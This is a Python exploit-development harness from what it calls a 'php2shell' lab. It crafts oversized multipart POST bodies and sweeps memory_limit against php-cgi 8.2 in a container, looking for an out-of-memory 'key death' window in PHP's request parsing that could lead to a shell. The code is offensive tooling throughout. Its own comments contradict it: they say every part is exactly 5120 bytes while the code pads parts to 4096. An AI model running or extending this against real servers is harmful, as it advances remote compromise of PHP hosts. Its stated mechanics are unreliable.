#!/usr/bin/env python3
"""php2shell lab, oom30: phased parts — donation starves the key.

Mechanism (from oom28/29 traces):
  * part = exactly 5120B -> multipart reads refill on part boundaries,
    the line buffer NEVER doubles (no 8192/20480 victim stealing the wall);
  * key class = 2 pages (name ~5040 -> zend_string 2 pages), param dup
    also 2 pages and freed each part -> donation chain funds the NEXT
    PARAM, while each key needs a fresh 2-page run -> at the wall the
    key dies POST-COMMIT (commit printed, no keyok).
Sweep memory_limit in 1-page steps; detector = commits > oks.
usage: oom30.py [limit_start] [limit_stop] [step]
"""
import re
import subprocess
import sys

NAMELEN = 3990          # -> param dup + key zend_string both 2-page class
OVER = len('--BOUND\r\nContent-Disposition: form-data; name="p' +
           '[x]"\r\n\r\nv\r\n') + 8   # rough; adjusted by padding below
BIN = "/usr/src/php-8.2.34/sapi/cgi/php-cgi"


def part_seg(i, namelen):
    # total part size must be exactly 5120 bytes: "PREFIX name=\"pKKKi[x]\"\r\n\r\nv\r\n"
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (namelen - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    tail = b"v\r\n"
    pad = 4096 - (len(head) + len(tail))
    if pad < 0:
        raise SystemExit("part too big: %d" % (len(head) + len(tail)))
    return head + b"P" * pad + tail


def build(nparts):
    # pad structure: head+tail+pad == 5120 exactly for every part
    ps = [part_seg(i, NAMELEN) for i in range(nparts)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def run(body, limit):
    subprocess.run(["docker", "exec", "-i", "phpbuild", "sh", "-c", "cat > /tmp/body.bin"],
                   input=body, capture_output=True, timeout=120)
    cmd = ("REQUEST_METHOD=POST CONTENT_TYPE='multipart/form-data; boundary=BOUND' "
           "CONTENT_LENGTH=%d REDIRECT_STATUS=200 SCRIPT_FILENAME=/tmp/t_probe.php "
           "%s -d memory_limit=%d -d post_max_size=4096M -d max_input_vars=100000 "
           "</tmp/body.bin >/tmp/o.log 2>/tmp/e.log; echo RC=$?")
    r = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c", cmd % (len(body), BIN, limit)],
                       capture_output=True, timeout=300)
    tr = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c", "cat /tmp/e.log /tmp/o.log"],
                        capture_output=True).stdout.decode("latin1")
    return r.stdout.decode().strip(), tr


def main():
    nparts = 4200
    body = build(nparts)
    lens = {len(part_seg(0, NAMELEN)), len(part_seg(1, NAMELEN))}
    print("oom30d body=%d partlen=%s" % (len(body), lens), flush=True)
    start = int(sys.argv[1]) if len(sys.argv) > 1 else 20000000
    stop = int(sys.argv[2]) if len(sys.argv) > 2 else 26000000
    step = int(sys.argv[3]) if len(sys.argv) > 3 else 262144
    for limit in range(start, stop, step):
        rc, tr = run(body, limit)
        commits = re.findall(r"TRACE keycommit stage=1 elem=(\d+) free=(\d+)", tr)
        oks = len(re.findall(r"TRACE keyok", tr))
        tried = re.findall(r"tried to allocate (\d+) bytes", tr)
        key_death = len(commits) > oks
        verdict = "KEY-DEATH" if key_death else (
            "fatal:" + (tried[-1] if tried else "?") if "Allowed memory" in tr else "survive")
        print("limit=%d %s commits=%s oks=%d lastfree=%s tried=%s" %
              (limit, verdict, commits[-1][0] if commits else "-", oks,
               commits[-1][1] if commits else "-", tried[-1] if tried else "-"), flush=True)
        if key_death:
            idx = tr.rfind("TRACE keycommit")
            print("*** KEY DEATH — POST-COMMIT WINDOW OPEN ***")
            print(tr[idx:idx + 600])
            break


if __name__ == "__main__":
    main()
